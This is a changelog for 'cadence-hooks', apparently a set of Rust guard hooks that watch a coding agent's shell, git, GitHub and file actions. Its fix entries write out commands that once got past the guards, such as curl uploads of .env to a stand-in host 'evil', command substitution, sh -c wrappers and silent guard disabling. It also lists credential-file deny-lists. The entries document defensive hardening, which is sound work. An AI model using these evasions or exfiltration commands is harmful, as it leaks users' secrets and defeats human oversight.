  pruned within ~one heartbeat of crossing the 30-min threshold, independent of
  any fresh SessionStart. `touch_own` runs first (self's mtime refreshed to
  ~now), so a quiet session can never sweep its own aged file (#69); the
  staleness threshold and the own-session exclusion are unchanged.

## [0.35.0] - 2026-06-20

### Added

- **session: deterministic backstop for outro's "no loose ends" contract**
  (#123 on claude-configurations). `cadence:outro` accounts for every thread a
  session opens against five terminal dispositions, but that contract is skill
  prose — a session can end without `/outro` and work slips away silently. Two
  new `session` subcommands add the deterministic belt to that probabilistic
  suspenders. `backstop-record` is a SessionEnd Logger (mirrors `session end`)
  that probes the repo for loose ends — uncommitted/untracked
  (`git status --short`), unpushed commits (`@{u}..`, only when an upstream
  exists), and stashes — and, when any remain *and no live peer is still in the
  checkout*, stashes a counts-only marker in the git-excluded `.claude/sessions/`.
  The lights-out gate (only the last session out records) keeps a shared
  multi-session checkout from recording a live peer's in-progress work as loose
  ends. `backstop-warn` is a SessionStart Check
  (mirrors the `session start` disclosure) that reads the marker at the next
  open, emits a one-shot nudge summarizing what was left, and deletes it. It
  **never blocks** (ADR-0001) — a nudge, exit 0. The design is deferred
  (SessionEnd → next SessionStart) because `HookEvent` has no `SessionEnd`
  variant and `Stop` fires after every turn, so the next SessionStart is the only
  reliable user-visible end-of-session surface. If outro (or any commit/push)
  resolved the work, git is clean → no marker → silent automatically; for
  deliberately-left work, set `CADENCE_NO_OUTRO_BACKSTOP`. The message states
  only what is observable ("loose ends remained at session end") and never claims
  outro was skipped. The marker filename carries no `.json` extension so the
  registry's `sweep_stale` never reaps it before the repo is reopened. Wiring
  lands in cadence-canon's `SessionEnd`/`SessionStart` arrays.

## [0.34.0] - 2026-06-19

### Added

- **AskUserQuestion guidance moves from prose/shell to two Rust nudge hooks**
  (`rules warn-recommended-option`, `rules warn-empty-answers`).
  `warn-recommended-option` (PreToolUse) nudges Claude to label a clearly-preferred
  option "(Recommended)" and list it first when no option across the questions
  carries the marker — a deterministic call-time reinforcement of the conditional,
  drift-prone always-loaded rule that the model had quietly stopped applying.
  `warn-empty-answers` (PostToolUse) ports the retired `guard-askuserquestion.sh`:
  it re-asks-as-plain-text when the answers dict is empty or every value is garbage
  (`""`/`.`/`null`/`undefined`), the auto-approve artifact from
  anthropics/claude-code#29962. Both are nudges, never blocks — the rule is
  conditional ("when you have a clear preference"), so a block would over-apply to
  genuinely-equivalent options. New `ToolInput.questions` / `ToolResponse.answers`
  fields on the hook payload back the checks (previously dropped by serde).
  Companion `hooks.json` wiring ships in `cadence-rules`. Supersedes ADR 0012's
  shell implementation (ADR 0020).

## [0.33.0] - 2026-06-19

### Changed

- **nudge-polish-before-pr: tighten the wording and require a stated skip
  reason**. Trims the 0.32.0 message ~35% (same beats — what polish does,
  behavioral-markdown-is-in-scope, `/polish docs` for literal docs, the two real
  skips, process-is-not-polish) and adds a final clause: *if you skip, say so
  and why — don't skip silently*. A silent skip is where the rationalization
  hides; forcing the model to state the reason surfaces it for the user to veto.
  A third unit test pins the `don't skip silently` clause.

## [0.32.0] - 2026-06-19

### Changed

- **nudge-polish-before-pr: behavioral markdown is in scope; close the "it's
  just docs" skip loophole**. The pre-PR `/polish` nudge was being rationalized
  away on skill / agent / command / rule-markdown branches as "trivial" or
  "already reviewed." It now states plainly that skill, agent, command, and rule
  markdown (and CLAUDE.md) are *behavior, not documentation* — so they are IN
  scope — routes a branch that is *literally* documentation to `/polish docs`
  instead of a skip, and narrows the skip conditions to a trivial one-liner or a
  branch already taken through `/polish`. It also denies the second common
  rationalization: having planned the work, used TDD, or gone through attune or
  a manual code-review is *not* the same as running the polish skill — those
  precede polish, they don't replace it. Two unit tests assert the "behavior,
  not documentation" and "not the same as running the polish skill" clauses so
  the loopholes cannot silently regress.

## [0.31.0] - 2026-06-17

### Added

- **prevent-secret-writes: scan written content for live secret values** (#85 on
  claude-configurations). Beyond the filename/`.env` checks, Write/Edit now scans
  the *introduced* content of any non-exempt file for high-confidence credential
  shapes — AWS access keys (`AKIA`/`ASIA`), GitHub tokens (`ghp_`/`gho_`/…/
  `github_pat_`), OpenAI keys (`sk-`/`sk-proj-`), Slack tokens (`xox[baprs]-`),
  and PEM private-key headers — and blocks, naming the kind without ever echoing
  the value. Runs before the safe-template allow, so a real key pasted into
  `.env.example` is still caught. JWTs and generic high-entropy strings are
  deliberately not matched (unbounded false positives); only this repo's own
  source is exempt (its test fixtures carry secret-shaped literals).
- **session: deregister on SessionEnd so ended sessions stop lingering as
  phantom peers** (#97 on claude-configurations). Liveness was mtime-only with
  no deregistration ceremony, so an ended session (`/clear`, exit, logout)
  lingered in `.claude/sessions/` until the next `session start` swept it by age
  (up to 30 min) — and the next session's SessionStart disclosure listed the
  dead session as a live peer. A new `session end` fire-and-forget Logger
  (wired to the SessionEnd event in cadence-canon) removes the session's own
  registry file via `registry::remove_own`. It gates strictly on
  `hook_event_name == "SessionEnd"` (a delete must never fire on another event)
  and removes only the record whose stored `session_id` matches exactly
  (content-verified via the #90-hardened `find_own`), so it can never delete a
  peer's lane. `HookEvent` has no `SessionEnd` variant, so it is modelled as a
  Logger (`event: None`) like `heartbeat` — no enum change.

### Fixed

- **git-safety: `git rebase --onto <protected>` is no longer falsely blocked**
  (#74 on claude-configurations). `check_rebase_blocked` flagged any rebase
  whose args contained a bare `main`/`master`, catching `git rebase --onto main
  <upstream> <branch>` — a documented stacked-PR restack where main is the
  replay destination and is never rewritten. The token following `--onto` is now
  exempt; a protected branch named anywhere else (plain `git rebase main`, or as
  the trailing `<branch>`) still blocks.
- **secret guards: block `.git-credentials`, `.pgpass`, `.aws/credentials`,
  `.kube/config`** (#77 on claude-configurations). These plaintext credential
  stores were in neither deny-list, so Read/Grep/Write/Edit operated on them
  freely. `.git-credentials`/`.pgpass` (unique basenames) join
  `BLOCKED_FILENAMES`; `.aws/credentials`/`.kube/config` join
  `BLOCKED_PATH_FRAGMENTS` as parent-dir-qualified fragments so a bare
  `config`/`credentials` file elsewhere is not over-blocked. (The Bash arms stay
  `.env`-family-only, as for `id_rsa`/`.netrc` today.)
- **session: registry records are written atomically** (#79 on
  claude-configurations). `write_record` used `fs::write` (truncate-then-write),
  exposing a window where a concurrent `read_peers` lands on a 0-byte/partial
  file, fails to parse, and silently drops a live peer — worst case, a peer
  missing from the one-shot SessionStart disclosure for the whole session.
  Records now stage to a temp file in the same directory and `rename` over the
  target, so a reader only ever sees a complete document. The temp is created
  with `O_EXCL` and the rename replaces the target path itself, so the write is
  symlink-safe end to end.
- **session: the lane guard now assesses MultiEdit** (#80 on
  claude-configurations). The guard matched only Edit/Write, so a MultiEdit into
  a peer's declared `touching` lane slipped through unwarned. MultiEdit carries a
  top-level `file_path`, so matching the arm is sufficient (the hook matcher
  already routes MultiEdit to the binary).
- **obsidian trash_guard: quoted vault paths no longer evade the check** (#82 on
  claude-configurations). When cwd was outside the vault, the in-vault scan used
  raw `split_whitespace`, so a quoted absolute vault path evaded it — a leading
  `"` defeated the absolute-path test, and a quoted path with spaces (e.g.
  `Field Reports/…`) was shredded across tokens. The scan now uses the
  quote-aware `core::shell::tokenize`, so `rm "/vault/Field Reports/old.md"` is
  caught; out-of-vault quoted paths stay allowed.
- **content guards: terminology, orphaned-todos, and line-endings now inspect
  MultiEdit** (#83 on claude-configurations). All three gated on
  `input.content()`, which is `None` for a MultiEdit payload (it carries
  `edits[]`), so every MultiEdit hit the early allow() unchecked. A new
  `HookInput::edit_fragments()` exposes the introduced/removed fragment pairs —
  one per `edits[]` element — that the guards fold over; terminology preserves
  its introduced-vs-existing diff (#63) per edit. Write/single-Edit behavior is
  unchanged.
- **git-safety: block history-rewrite and remote-mirror destruction** (#84 on
  claude-configurations). `git filter-branch`/`filter-repo` (mass history
  rewrite), `git update-ref` deleting or repointing a protected branch, and
  `git push --mirror` (overwrites/deletes all remote refs) fell through to
  Allow. Now blocked; a non-protected `update-ref -d` nudges.
- **guard-gh-write: cover release upload, secret/variable set, label clone**
  (#87 on claude-configurations). These write GitHub state and accept `-R`, but
  the noun/verb table missed them, so ownership was never checked. Added via a
  separate anchored pattern so `clone` can't make `gh repo clone` (a local read)
  look like a write. (`gh ruleset` is read-only — written via `gh api`, already
  covered; account-level `ssh-key`/`gpg-key` and `--owner` `project` excluded.)
- **dispatch: protect security guards from silent `CADENCE_DISABLE`** (#89 on
  claude-configurations). Disabling a guard by name exited 0 with no trace, and
  nothing exempted the enforcement guards — `CADENCE_DISABLE=git-safety` silently
  neutered it. Now every disable emits a one-line stderr notice, and a protected
  set (secret/git/gh/vault/browser/trash guards) refuses to disable and still
  runs. Use the loud, per-session `CADENCE_BYPASS` for maintenance.
- **session: `find_own` verifies the full `session_id`, not the 8-char suffix**
  (#90 on claude-configurations). `find_own` resolved a session's own record by
  the `.<short-id>.json` filename suffix and returned the first `read_dir` match
  without ever parsing it, so two sessions whose ids share the first 8 chars
  (notably manual `--session-id` values) cross-resolved — `read_own`/`touch_own`
  and the drift baseline could read or overwrite the *other* session's record. A
  new `matches_own` parses the candidate and checks the full `session_id`;
  `find_own` returns only a verified match (and `None` when more than one
  verifies — ambiguous). `sweep_stale` inlined the same suffix-only
  self-exclusion (the twin site), so a stale peer sharing the prefix was wrongly
  spared from the sweep; it now verifies the full id too.
- **terminology: anchor the source-exemption to path components** (#91 on
  claude-configurations). The `cadence-hooks/`/`.claude/hooks|rules`/`claude.md`
  exemptions were unanchored substrings, so a sibling `legacy-cadence-hooks/`, a
  spoofed `x.claude/hooks/`, or `evilclaude.md` got a free pass. Now matched on
  `/`-split components.
- **memory-guard: measure the resulting file and anchor to the auto-memory
  root** (#92, #93 on claude-configurations). The 200-line cap counted the Edit
  *fragment* (`content()`), so an Edit appending to a near-limit MEMORY.md was
  allowed while the file grew past the cap — now uses `effective_content()`. The
  `/memory/` path test over-matched any project file with a `memory/` dir — now
  anchored to `<config>/projects/<slug>/memory/` with `.`/`..`/`\` normalized
  before matching, so a nested `docs/memory/` or a `..`-traversal path neither
  over-matches an ordinary file nor smuggles MEMORY.md past the cap.
- **prevent-secret-leaks: sharpen the echo-secret nudge** (#85 on
  claude-configurations, partial). The exfil nudge matched uppercase `KEY`/
  `SECRET`/… against the original-case command, so `echo $database_password`
  (lowercase) was missed; keywords are now lowercased on both sides, and
  `echo`/`printf` match at command position (not substring) so a benign arg or
  path containing those words no longer over-fires. (The secret-value content
  scanner — the rest of #85 — ships separately.)
- **metrics: atomic subagent log writes, current model prices, tail-bounded
  transcript scan** (#94, #95, #96 on claude-configurations). `log-subagent`
  built its JSONL line with `writeln!` (many small writes that tear under
  concurrent appends) — now one `write_all`, matching the sibling loggers.
  `prices.json` gained `claude-opus-4-8` and `claude-fable-5` (commit cost was
  silently `$0` for the current default models), plus an `unpricedModels` record
  field so an unknown model is loud rather than a silent zero. `scan-tokens`
  parsed the entire transcript on every commit; it now byte-scans past the
  marker and only JSON-parses the tail, bounding the per-commit hot-path cost.

## [0.30.0] - 2026-06-16

### Fixed

- **cadence secret guards: block the `.env.<x>` family on Read/Grep/Write/Edit**
  (#64 on claude-configurations). The `.env` family was classified two ways: the
  Bash path used a component substring-minus-safe-suffix predicate over
  `.env.<x>`, while the Read/Grep/Write/Edit tool path used exact membership
  against `BLOCKED_FILENAMES` — which omitted `.env.prod`, `.env.dev`,
  `.env.development.local`, `.env.docker`, and the rest. So `Read .env.prod` was
  allowed while `cat .env.prod` was blocked — the most-used ingestion tools were
  the weakest check. The family logic is now a single shared
  `is_env_family_secret` helper called from both predicates, so the tool and
  shell paths agree on one rule.
- **guardrails: validate an explicit `git push <URL>` against ownership**
  (#68 on claude-configurations). `extract_remote` rejected any non-remote token,
  so an explicit push URL (HTTPS or SCP) was discarded and the guard resolved and
  validated `origin` in its place — allowing an irrecoverable push to an
  arbitrary unowned host whenever `origin` happened to be owned. The new
  `extract_push_target` classifies the positional target as `Named`, `Url`, or
  `None` (tracking fallback); a `Url` is validated directly via `check_owner`,
  blocking unowned hosts and naming the actual URL in the block message, while
  `Named`/`None` keep the existing resolve-through-git behavior. URL detection
  reuses `host_and_repo_from_url` (the same parser `check_owner` uses) and covers
  the user-less SCP form (`host:owner/repo.git`).
- **session: the stale-sweep no longer prunes live peers, and drift baselines on
  a declared branch** (#69, #70 on claude-configurations). `run_start` now
  reads/builds/writes its own record (refreshing mtime) *before* calling
  `sweep_stale`, eliminating the self-sweep-then-minimal-rebuild path that
  stripped a quiet session's intent/touching on `/clear` or compaction;
  `sweep_stale` also excludes the caller's own file, and the staleness threshold
  rises 10 → 30 minutes so a long read/think phase stays out of reach. The
  commit-time drift warning now baselines against a new `declared_branch` field
  that moves only when *this* session runs its own checkout/switch (detected via
  the heredoc-aware `is_branch_switch`), so a peer moving shared HEAD no longer
  masks divergence. Old records parse with `declared_branch=None` via serde
  defaults (fail-open) and self-heal on the next session start — no migration.

## [0.29.0] - 2026-06-10

### Fixed

- **core::shell: model heredoc bodies, command substitutions, and visible
  assignments** (#116 on claude-configurations). `split_segments` now strips
  heredoc bodies before splitting, so a heredoc line like `see the .env file`
  no longer becomes a fake `see` command with a `.env` operand — a real
  prevent-secret-leaks false-block on 0.28.0. `command_segments` additionally
  surfaces command substitutions (`$(…)`, backticks) in executed context, so
  `echo $(cat .env)`, `curl -d "$(cat .env)" …`, and `echo \`cat .env\`` are
  judged as the reads they are; and resolves visible `VAR=value` assignments,
  so `OP_CMD=op; $OP_CMD item list` is seen as `op item list`. Single-quoted
  and escaped forms stay literal; an environment-sourced variable stays
  unresolved (fail open). A body is dropped only when its terminator is found
  (an exotic delimiter or a `<<` inside double quotes keeps the lines, so a
  command bash executes is never silently dropped). Every guard inherits these
  through `command_segments`.
- **git-safety: consume remaining separate-arg global flags; nudge
  `checkout --` named-pathspec discards** (#117 on claude-configurations).
  Git's remaining enumerable global flags that take a separate argument —
  `--namespace`, `--super-prefix`, `--config-env`, `--attr-source` — now
  consume their argument, so `git --namespace ns push --force origin main` no
  longer hides the subcommand and escapes (only a truly unknown future
  separate-arg flag remains a documented gap). `git checkout [-<ref>] --
  <named paths>` now nudges — the same overwrite-local-edits operation as
  `git restore <named path>` — since everything after `--` is unambiguously a
  pathspec; discard-all forms (`.`, `./`, `:/`) keep blocking, and bare
  `git checkout <name>` without `--` stays out of scope.
- **secret guards: `find -exec`/`-delete` no longer escapes the metadata-safe
  exemption** (#118 on claude-configurations). `find` is metadata-safe on its
  own, but `find . -name .env -exec cat {} \;` printed contents and `find .
  -name .env -delete` / `-exec rm {} \;` destroyed the file — both allowed on
  0.28.0. prevent-secret-leaks now judges the exec-family subcommand (`-exec`,
  `-execdir`, `-ok`, `-okdir`): a non-metadata-safe action with a dangerous
  `.env`-family token among find's args blocks, while `-exec ls …` and a plain
  `find -name .env` stay allowed. prevent-secret-writes blocks `find` carrying
  `-delete` or an exec-family writer verb (`rm`, `tee`, `cp`, `truncate`, …)
  against a dangerous env file; safe templates and non-`.env` targets stay
  allowed.
- **secret guards: `.envrc` blocked on the tool side, not just Bash** (#119 on
  claude-configurations). `.envrc` was treated as dangerous in Bash (`cat
  .envrc` blocked) but `BLOCKED_FILENAMES` omitted it, so Read, Grep, Write,
  and Edit operated on it freely — a tool-side escape hatch. Adding `.envrc` to
  the shared list closes it across both guards; `.envrc.example` stays allowed
  (the safe-template check runs first), and `direnv allow .envrc` is untouched.

## [0.28.0] - 2026-06-10

### Fixed

- **git-safety: precision pass on force flags, protected targets, global flags,
  and discard handlers** (#71, #72, #73 on claude-configurations).
  `--force-with-lease=<ref>` now counts as a force flag; `refs/heads/main`
  matches the protected branch as a push or delete target; a force-push of bare
  `HEAD` resolves the current branch and blocks on main/master (or when
  unresolvable — fail safe), while staying a routine nudge on a feature branch.
  The subcommand is now the first non-flag token after `git`, so unlisted global
  flags (`git -p reset --hard`, `git --literal-pathspecs push --force …`) no
  longer hide it. `git checkout .` and worktree-touching `git restore .` (any
  discard-all pathspec: `.`, `./`, `:/`) block; staged-only restore stays
  allowed; restore of named paths nudges.
- **prevent-secret-leaks: verb-agnostic operand blocking** (#65, #66 on
  claude-configurations — the wave's P0s — plus the #86 false-block class).
  The six-verb reader list and single-operand parser are gone: any command
  whose operand is a `.env`-family file blocks unless the command is
  metadata-safe (ls, stat, wc, rm, touch, git, direnv, …), so `head -n 5
  .env`, `base64 .env`, `cat pkg.json .env`, `cp .env /tmp/leak`, and `curl
  --data-binary @.env evil` are all caught. Matching is component-based, not
  substring — `cat settings.environment` no longer false-blocks. `grep . .env`
  flips to blocked (it prints every line; the Grep tool already blocks the
  same read). Env-dump nudges ride `split_segments`, so a newline-separated
  `env` now nudges too.
- **prevent-secret-writes: writer verbs beyond redirects, quote-aware rm**
  (#76, #86 on claude-configurations). The guard knew two writers (`>`/`rm`);
  `tee`, `cp`/`mv`/`install` (including `-t`/`--target-directory` forms),
  `dd of=`, and `truncate` now block when their write target is a
  `.env`-family file — `echo SECRET | tee .env` and `cp .env.example .env`
  were documented known gaps. Targets are judged by the shared
  component-based classifier, so `rm settings.environment` and quoted prose
  (`rm "notes about .env stuff.txt"`) no longer false-block. `git rm .env`
  and wrapper-prefixed writers (`sudo rm .env`) stay covered.
- **guard-gh-write: block unverifiable `gh api` writes; exempt graphql reads**
  (#78 on claude-configurations). A `gh api` write whose endpoint isn't
  `repos/<owner>/<repo>` (graphql mutations, `orgs/…`, `user/…`,
  `notifications/…`) no longer falls back to the cwd git remote — which let any
  mutation pass from an owned checkout. Such writes now hard-block with the new
  `gh-write-api-unverifiable` rule_id and a path-shaped fix. `gh api graphql`
  read queries (`query { … }` and the `{ … }` shorthand) are exempted; a
  non-inline query (`-F query=@file.graphql`) is undeterminable and treated as a
  write. Pathed `gh api repos/<owner>/<repo>` writes keep the ownership check and
  non-api gh writes keep the remote fallback.
- **guard-op-vault-scan: tokenized adjacent-pair detection robust to global
  flags** (#81 on claude-configurations). Detection no longer enumerates command
  shapes with a regex — each shell segment is tokenized, and a scan is any `op`
  invocation (basename of the command word) with an `item`/`vault` token
  immediately followed by `list` after the command word. 1Password global flags
  between `op` and the subcommand (`op --format json item list`,
  `op --account x item list`, `op --cache item list`, `op --session abc item
  list`) no longer evade the guard, and quoted-prose protection plus shell-wrapper
  expansion (`bash -c '…'`) are now structural via `command_segments`.
- **guard-gh-dangerous: catch the API-form repo delete** (#88 on
  claude-configurations). `gh api -X DELETE repos/<owner>/<repo>` is an
  irreversible repo deletion that the subcommand-form regex (`gh repo delete`)
  never saw. A tokenized pass now blocks it across every Cobra method spelling
  (`-X delete`, `--method delete`, `-X=DELETE`, `--method=DELETE`, `-XDELETE`),
  in chains and `sh -c` wrappers, but only at exact owner/repo depth — sub-resource
  deletes (`repos/o/r/issues/1`, `repos/o/r/git/refs/heads/x`) stay allowed.

## [0.27.0] - 2026-06-10

### Added

- `core::shell::split_segments` / `command_segments` — quote-aware splitting of a
  shell command into its top-level segments (`&&`, `||`, `;`, `|`, `&`, newline),
  with recursive `sh -c '…'` wrapper expansion. The shared primitive guards use
  to judge every command a shell will run, not just the first.

### Fixed

- **git-safety: compound-command and quote-aware bypasses** (#61, #62, #63).
  git-safety now judges every command in a chain — `git status && git push
  --force origin main` no longer slips because the first command is benign — and
  sees through `sh -c '…'` wrappers, matches path-form git (`/usr/bin/git`),
  reads quoted flags (`"--force"`), and exempts an alias definition only for its
  own segment instead of the whole command line.
- **guard-gh-write: chained writes resolved per-segment** (#67). A gh write chain
  is now judged one command at a time — `gh pr comment -R me/owned … && gh repo
  delete evil/unowned --yes` no longer slips because the benign first `-R`
  resolved the whole chain. Each write segment resolves its own target (and a
  write hidden in `sh -c '…'` is seen); the first unowned/unresolvable write
  blocks. Loop handling and structured block payloads are unchanged.
- **prevent-secret-writes: every redirect in a chain is inspected** (#75). The
  guard scanned only the first `>`/`>>`, so `echo ok > safe.txt && echo SECRET >
  .env` slipped. It now scans each command segment for all redirect operators —
  `>`, `>>`, `>|`, and stderr/fd forms (`2>`) — quote-aware (a `>` inside a
  string is literal), plus `rm` targets, and sees writes hidden in `sh -c '…'`.
  `split_segments` also no longer mis-splits the `>|` clobber operator as a pipe.

## [0.25.0] - 2026-06-08

### Added

- `guard-browser-device` (guardrails, PreToolUse) blocks the **first**
  Claude-in-Chrome MCP tool call of a session (`mcp__claude-in-chrome__*`),
  exiting 2 with a re-clarify message that routes through
  `list_connected_browsers` → `AskUserQuestion` → `select_browser`. It writes a
  per-session marker and allows every subsequent call — a one-shot handshake so
  an unconfirmed action can't land on the wrong physical Chrome when several are
  paired to one account. **Deliberate policy exception** to `developing-guards`'
  block-vs-nudge heuristic: a single connected browser would route to a nudge,
  but a nudge is exit 0 and the tool still runs, so its context would arrive
  *after* the action already hit a device. Stopping *before* the irreversible
  side effect requires exit 2. The guard fires at most once per session, fails
  open on any error (ADR-0001), and does not verify a device was actually chosen
  — it trusts the model to act on the message, then opens the gate. (Companion
  `mcp__claude-in-chrome__.*` matcher ships in `cadence-guardrails`'s `hooks.json`.)
- `warn-overshare` (cadence): nudges Claude to audit about-to-ship content (commit messages, PR/issue bodies, changed files) for personal-context overshare — disabilities, neurodivergence, health, relationships, family, non-technical biographical detail. Fires on `git push`, `git commit`, `gh pr create`, `gh pr edit`, `gh issue create`, `gh issue comment`, and Write/Edit to `docs/field-reports/` paths. Skips writes under `$OBSIDIAN_VAULT` (the safe destination for personal context) and to `docs/blog/*retro*` paths (retros feed blog articles and are intentionally personal). Session-scoped bypass: `CADENCE_SKIP_OVERSHARE_AUDIT=1`. (Companion `hooks.json` wiring ships in `cadence-guardrails`.)
- New `guardrails inject-gh-context` check (SessionStart): renders the configured gh-write allowlist (`CADENCE_ALLOWED_OWNERS`, `CADENCE_ALLOWED_REPOS`, `CADENCE_EXTRA_HOSTS`) and the `gh ... -R owner/repo` rule into Claude's context at session start, resume, and post-compaction. Companion wiring ships in `cadence-canon`'s `hooks.json`. Primes the model with the same context `guard-gh-write` enforces, recovering "silent damage" cases where `cwd`'s remote happens to be allowlisted but is not the intended write target.

## [0.24.0] - 2026-06-08

### Added

- New `CheckResult::block_structured(message, BlockMetadata)` builder + `BlockMetadata` struct (`rule_id`, `fix`, `allowed_owners`, `severity`) in `cadence_hooks_core`. When a check returns a structured block on a PreToolUse event, `run_check` now emits a `permissionDecision: "deny"` JSON envelope on stdout (carrying both `permissionDecisionReason` for the prose and `additionalContext` for the structured payload) alongside the legacy stderr+exit-2 message — Claude self-corrects from the machine-parseable shape instead of re-parsing prose. The legacy `CheckResult::block(...)` path is unchanged; checks opt in by calling `block_structured`.
- `guardrails guard-gh-write` upgraded three of its hard-block sites to the new primitive:
  - `gh-write-unauthorized-target` — `fix` substitutes the first allowed owner under the same project name (e.g. `evil-corp/cool` → `-R cameronsjo/cool`).
  - `gh-write-target-unresolvable` — `fix` is `-R <first-allowed-owner>/<repo>` when no repo can be inferred.
  - `gh-write-loop-missing-repo` — `fix` is the resolved repo when a deterministic loop's cwd resolves to an owned repo, or `-R <owner>/<repo>` otherwise.

  The unconfigured fail-safe and fork-not-allowed paths intentionally stay on the legacy `block` for now and will follow in a separate PR.

## [0.23.0] - 2026-06-06

### Added

- Hard blocks now carry a feedback-channel footer — `If this fired in error: /cadence:feedback` — appended to the stderr message of any `Outcome::Block`. It turns a false-positive block into one structured issue on the meta-repo (`cameronsjo/claude-configurations`) via the new `cadence:feedback` skill, instead of silent friction. Nudges and loop-blocks are untouched (they aren't errors). Suppress with `CADENCE_NO_FEEDBACK_FOOTER` set to any non-empty value.

## [0.21.0] - 2026-06-05

### Added

- Native Windows support for the binary. CI now runs check/clippy/test on `windows-latest`, and the release pipeline builds an `x86_64-pc-windows-msvc` leg, shipping `cadence-hooks.exe` in a `.zip` (with checksum + provenance) alongside the existing unix `.tar.gz` artifacts. The Homebrew tap dispatch is unchanged.

### Changed

- Replaced ten POSIX-only assumptions with portable code so the binary is correct outside WSL/unix: a `cadence_hooks_core::paths::user_home()` helper (`HOME` → `USERPROFILE` → `HOMEDRIVE`+`HOMEPATH`) and `marker_temp_dir()` (`std::env::temp_dir`) replace `HOME`-or-`/tmp` reads and hardcoded `/tmp` markers; a single jiff-backed `cadence_hooks_core::time` module replaces four `date -u` shell-outs (and gives `warn-cron-datetime` portable local time + timezone + weekday); and `obsidian-trash-guard` normalizes both the vault root and hook paths before comparison. Adds `jiff` as the one new dependency.

## [0.20.0] - 2026-06-04

### Changed

- `guard-git-init` now also fires on `gh repo create` (not just `git init`), and its nudge frames the license as the author's decision — routing to `/cadence-groundwork:choosing-license` to compare options before assuming one. The guard name is unchanged. (Companion `if`-filter broadening ships in `cadence-guardrails`'s `hooks.json`.)

## [0.19.0] - 2026-06-04

### Changed

- `validate-skill-frontmatter` now accepts an optional `namespace:` prefix on a skill's `name:` field — the `plugin:directory` invocation id (e.g. `name: cadence:attune`, `name: cadence-forge:add-narrative-logging`). Bare names still pass; the post-colon suffix must still equal the skill directory, so `cadence:wrong` for an `attune/` dir is still blocked. The namespace itself is not verified against the plugin name: deriving the plugin from the file path is fragile (source vs cache) and the check must not force the prefix on non-cadence users. This reverses the prefix-rejection tightened in #65 — the cadence ecosystem standardizes on the prefix for discoverability and self-documenting source.

## [0.18.0] - 2026-06-04

### Changed

- Global state paths (metrics, persona ledger, the `doctor` plugin scan) now honor `CLAUDE_CONFIG_DIR`, matching Claude Code's own config-dir relocation, instead of hardcoding `~/.claude`. A new `cadence_hooks_core::paths` module resolves the config dir (first non-empty comma entry, `~`-expanded; falls back to `~/.claude`); `doctor`'s plugin scan falls back to `~/.claude/plugins` when the config-dir variant is absent, staying correct whichever directory the plugin loader uses.

## [0.15.1] - 2026-06-02

### Changed

- `guard-pr-issue-link` renamed to `warn-pr-issue-link` and downgraded from a hard block to a nudge. PRs without a linked issue are a routine, intentional workflow; the check now reminds about closing keywords instead of blocking `gh pr create`. The companion `verify-pr-autoclose` (PostToolUse, advisory) is unchanged and still covers broken issue refs.

## [0.13.0] - 2026-06-01

### Added

- Five guardrails checks converting machine-enforceable prose rules from a personal CLAUDE.md into deterministic hooks (#52, #53):
  - `guard-op-vault-scan` (**block**) — `op item list` / `op vault list` enumeration, including inside exec wrappers. Single-item reads (`op read`, `op item get`) stay allowed; the guard targets enumeration, not access.
  - `warn-curl-alias` (nudge) — bare `curl` with `-H`/`--header` flags, for machines where curl is aliased to curlie (which infers POST from JSON-like headers, causing silent 400s). Per-segment analysis keeps `grep -H` and other piped tools from false-positiving.
  - `warn-gh-merge-preflight` (nudge) — pre-flight checklist on `gh pr merge`: draft PRs report MERGEABLE/CLEAN but fail with a GraphQL error (check `isDraft`); worktree checkouts break `--delete-branch` local cleanup; failed merges may have landed server-side (verify `mergedAt` before retrying).
  - `warn-coderabbit-retrigger` (nudge) — `@coderabbitai review` comments are no-ops on already-reviewed content (CodeRabbit's incremental review is content-cached, not SHA-cached); push a new commit instead.
  - `warn-alias-parsing` (nudge) — piping aliased-tool output (`cat`/`find`/`ls`/`du`/`df`/`top` → bat/fd/eza/dust/duf/btm) into parsers. Fires only when the aliased tool is a pipeline *producer*; consumer position (`git diff | cat`) and interactive use stay silent.
- `KNOWN_DISTINCT_SETTINGS_SCRIPTS` allowlist in the registration audit test, for settings.json scripts that trip the keyword-overlap heuristic without duplicating any plugin hook (first entry: `block-vault-git-writes.sh`, an Obsidian-vault guard unrelated to the 1Password `guard-op-vault-scan`).

## [0.12.0] - 2026-06-01

Backfilled entry — this release shipped without a changelog section.

### Added

- Three guardrails checks: `guard-dotfiles` (block direct edits to production dotfiles, opt-in via `CADENCE_GUARD_DOTFILES=1`), `guard-pr-issue-link` (block `gh pr create` without a closing issue keyword), `verify-pr-autoclose` (verify and repair issue auto-close after PR create/merge). (#43, #47)
- `doctor` subcommand cross-reference + registry export + `--quiet`. (#39, #48)

### Fixed

- Mid-line security-pattern line numbers + audit enforcement for the cadence-rules migration. (#49)

### Removed

- Homebrew beta channel retired; stable formula is the single release channel. (#39, #50)

## [0.11.0] - 2026-05-30

### Added

- `lab` namespace for the [cadence-lab](https://github.com/cameronsjo/cadence-lab) plugin: a two-hook **self-representation persona ledger**. `persona-nudge` (SessionStart, startup/clear) injects a constrained contract asking the model to record a per-session self-representation (form/qualities/stance/color/texture/confidence) to a staging file; `persona-gate` (PostToolUse/Write) runs Tier 1 schema validation with itemized feedback plus a Tier 2 regex cheek heuristic (warn mode → system-written `flags`), then promotes the validated record into an append-only `~/.claude/persona/personas.jsonl`. The ledger only receives hook-written, validated records. Configurable via `~/.claude/persona/config.json`; retry cap downgrades to a `forced-accept` flag. New crate `crates/lab/`. (#41)
- Core: `HookEvent::SessionStart`, and `Outcome::LoopBlock` + `CheckResult::loop_block` — the documented exit-0 `{"decision":"block","reason":...}` re-prompt primitive for PostToolUse feedback loops (a hard `exit 2` can't un-run a tool that already executed). `HookInput` gains `session_id`/`source`/`model` fields + accessors (`Default` derived); new `make_session` test builder. All backward compatible — existing Pre/Post hooks are unaffected.

## [0.10.0] - 2026-05-23

### Added

- `metrics` namespace: fire-and-forget loggers for the [cadence-metrics](https://github.com/cameronsjo/cadence-metrics) plugin, ported from its bash hooks. `snapshot` (PreToolUse) records HEAD before a `git commit`; `log-commit` (PostToolUse) scans the transcript for token usage since the last commit, computes USD cost from an embedded-but-overridable price table (`--prices` / `CADENCE_METRICS_PRICES`), and appends to `commits.jsonl`; `log-subagent` (SubagentStart/Stop) appends lifecycle records to `subagents.jsonl` (`CADENCE_METRICS_DEBUG=1` adds a `_keys` field). New `Logger` trait + `run_logger_from_stdin` in core keep logging (always exit 0) separate from the enforcement `Check` trait. JSONL output verified at parity with the bash hooks.
